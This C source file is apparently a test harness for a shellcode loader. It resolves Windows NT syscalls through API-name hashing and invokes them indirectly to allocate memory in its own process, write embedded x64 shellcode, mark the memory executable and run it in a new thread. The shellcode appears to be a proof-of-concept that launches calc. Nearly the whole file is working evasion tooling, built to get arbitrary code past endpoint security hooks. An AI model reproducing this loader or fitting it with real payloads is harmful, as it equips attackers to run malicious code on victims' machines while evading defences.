#include <stdio.h>
#include <stdint.h>
#include <windows.h>
#include <string.h>
#include <stdarg.h>
#include "debug.c"
#include "obf.c"
#include "syscall.c"
#include "syscallresolve.c"
#include "dump.c"


#define MEM_COMMIT 0x1000
#define MEM_RESERVE 0x2000
#define PAGE_READWRITE 0x04
#define PAGE_EXECUTE_READ 0x20

void print_debug(const char* msg) {
    printf("[+] %s [+]\n", msg);
}

void print_debugf(const char* format, ...) {
    va_list args;
    va_start(args, format);
    printf("[+] ");
    vprintf(format, args);
    printf(" [+]\n");
    va_end(args);
}


bool nt_inject_self_shellcode(const unsigned char* shellcode, size_t shellcode_size) {
    print_debug("starting self-injection process");

    uint16_t nt_alloc_num = get_syscall_number(get_hash("NtAllocateVirtualMemory"));
    uint16_t nt_write_num = get_syscall_number(get_hash("NtWriteVirtualMemory"));
    uint16_t nt_protect_num = get_syscall_number(get_hash("NtProtectVirtualMemory"));
    uint16_t nt_create_thread_num = get_syscall_number(get_hash("NtCreateThreadEx"));
    uint16_t nt_wait_num = get_syscall_number(get_hash("NtWaitForSingleObject"));
    uint16_t nt_close_num = get_syscall_number(get_hash("NtClose"));

    if (nt_alloc_num == 0xFFFF || nt_write_num == 0xFFFF || nt_protect_num == 0xFFFF || 
        nt_create_thread_num == 0xFFFF || nt_wait_num == 0xFFFF || nt_close_num == 0xFFFF) {
        print_debug("failed to resolve one or more necessary syscalls");
        return false;
    }
    
    print_debug("all necessary syscalls resolved");

    HANDLE current_process = (HANDLE)-1;
    void* base_address = NULL;
    SIZE_T size = shellcode_size;

    uintptr_t alloc_args[] = {
        (uintptr_t)current_process,
        (uintptr_t)&base_address,
        0,
        (uintptr_t)&size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    };
    uintptr_t status = indirect_syscall(nt_alloc_num, alloc_args, 6);
    if (status != 0) {
        print_debugf("ntallocatevirtualmemory failed with status: 0x%lx", status);
        return false;
    }
    print_debugf("allocated %zu bytes at 0x%p", size, base_address);

    SIZE_T bytes_written = 0;
    uintptr_t write_args[] = {
        (uintptr_t)current_process,
        (uintptr_t)base_address,
        (uintptr_t)shellcode,
        shellcode_size,
        (uintptr_t)&bytes_written
    };
    status = indirect_syscall(nt_write_num, write_args, 5);
    if (status != 0) {
        print_debugf("ntwritevirtualmemory failed with status: 0x%lx", status);
        return false;
    }
    print_debugf("wrote %zu bytes of shellcode", bytes_written);

    ULONG old_protect = 0;
    uintptr_t protect_args[] = {
        (uintptr_t)current_process,
        (uintptr_t)&base_address,
        (uintptr_t)&size,
        PAGE_EXECUTE_READ,
        (uintptr_t)&old_protect
    };
    status = indirect_syscall(nt_protect_num, protect_args, 5);
    if (status != 0) {
        print_debugf("ntprotectvirtualmemory failed with status: 0x%lx", status);
        return false;
    }
    print_debug("changed memory protection to page_execute_read");

    HANDLE thread_handle = NULL;
    uintptr_t create_thread_args[] = {
        (uintptr_t)&thread_handle,
        THREAD_ALL_ACCESS,
        0, // ObjectAttributes
        (uintptr_t)current_process,
        (uintptr_t)base_address, // StartAddress
        0, // Argument
        0, // CreateFlags
        0, // ZeroBits
        0, // StackSize
        0, // MaximumStackSize
        0  // AttributeList
    };
    status = indirect_syscall(nt_create_thread_num, create_thread_args, 11);
    if (status != 0) {
        print_debugf("ntcreatethreadex failed with status: 0x%lx", status);
        return false;
    }
    print_debugf("thread created with handle: 0x%p", thread_handle);

    LARGE_INTEGER timeout;
    timeout.QuadPart = -100000000; // 10 seconds
    uintptr_t wait_args[] = {
        (uintptr_t)thread_handle,
        FALSE,
        (uintptr_t)&timeout
    };
    status = indirect_syscall(nt_wait_num, wait_args, 3);
    print_debugf("ntwaitforsingleobject completed with status: 0x%lx", status);

    uintptr_t close_args[] = { (uintptr_t)thread_handle };
    indirect_syscall(nt_close_num, close_args, 1);
    print_debug("thread handle closed");

    return true;
}

int main(int argc, char* argv[]) {
    printf("[+] syshash c implementation test [+]\n");
    
    bool dump_mode = false;
    
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-debug") == 0) {
            debug_set_mode(true);
            print_debug("debug mode enabled");
        } else if (strcmp(argv[i], "-dump") == 0) {
            dump_mode = true;
            print_debug("dump mode enabled");
        }
    }
    
    debug_init();
    obf_init();
    init_syscall_cache();

    if (dump_mode) {
        printf("[+] dumping ntdll functions to files [+]\n");
        printf("[+] syscalls dumped to: syscalls.txt [+]\n");
        printf("[+] all functions dumped to: all_functions.txt [+]\n");
        
        const char* syscall_file = "syscalls.txt";
        const char* all_functions_file = "all_functions.txt";
        
        bool syscall_success = dump_syscalls_to_file(syscall_file);
        bool functions_success = dump_all_functions_to_file(all_functions_file);
        
        if (syscall_success) {
            printf("[+] syscalls dumped to: %s [+]\n", syscall_file);
        } else {
            printf("[+] failed to dump syscalls [+]\n");
        }
        
        if (functions_success) {
            printf("[+] all functions dumped to: %s [+]\n", all_functions_file);
        } else {
            printf("[+] failed to dump all functions [+]\n");
        }
        
        printf("\nverifying function lookup:\n");
        const char* test_functions[] = {
            "NtAllocateVirtualMemory",
            "NtWriteVirtualMemory", 
            "NtCreateThreadEx",
            "LdrLoadDll",
            "RtlInitUnicodeString"
        };
        
        for (size_t i = 0; i < 5; i++) {
            uintptr_t addr = get_ntdll_function_address(test_functions[i]);
            if (addr != 0) {
                printf("[+] %s: 0x%p [+]\n", test_functions[i], (void*)addr);
            } else {
                printf("[+] %s: not found [+]\n", test_functions[i]);
            }
        }
        
        printf("\n[+] dump complete [+]\n");
        
        cleanup_syscall_cache();
        cleanup_ntdll_cache();
        obf_cleanup();
        
        return (syscall_success && functions_success) ? 0 : 1;
    }

    unsigned char shellcode[] = 
        "\x50\x51\x52\x53\x56\x57\x55\x6A\x60\x5A\x68\x63\x61\x6C\x63\x54"
        "\x59\x48\x83\xEC\x28\x65\x48\x8B\x32\x48\x8B\x76\x18\x48\x8B\x76"
        "\x10\x48\xAD\x48\x8B\x30\x48\x8B\x7E\x30\x03\x57\x3C\x8B\x5C\x17"
        "\x28\x8B\x74\x1F\x20\x48\x01\xFE\x8B\x54\x1F\x24\x0F\xB7\x2C\x17"
        "\x8D\x52\x02\xAD\x81\x3C\x07\x57\x69\x6E\x45\x75\xEF\x8B\x74\x1F"
        "\x1C\x48\x01\xFE\x8B\x34\xAE\x48\x01\xF7\x99\xFF\xD7\x48\x83\xC4"
        "\x30\x5D\x5F\x5E\x5B\x5A\x59\x58\xC3";

    printf("[+] attempting to inject shellcode... [+]\n");
    if (nt_inject_self_shellcode(shellcode, sizeof(shellcode) - 1)) {
        printf("[+] success: shellcode injection routine completed [+]\n");
    } else {
        printf("[+] failed: shellcode injection routine failed [+]\n");
        if (!debug_is_enabled()) {
            printf("[+] run with -debug for more details or -dump to see ntdll functions [+]\n");
        }
    }

    cleanup_syscall_cache();
    cleanup_ntdll_cache();
    obf_cleanup();
    
    printf("\n[+] test complete [+]\n");
    return 0;
} 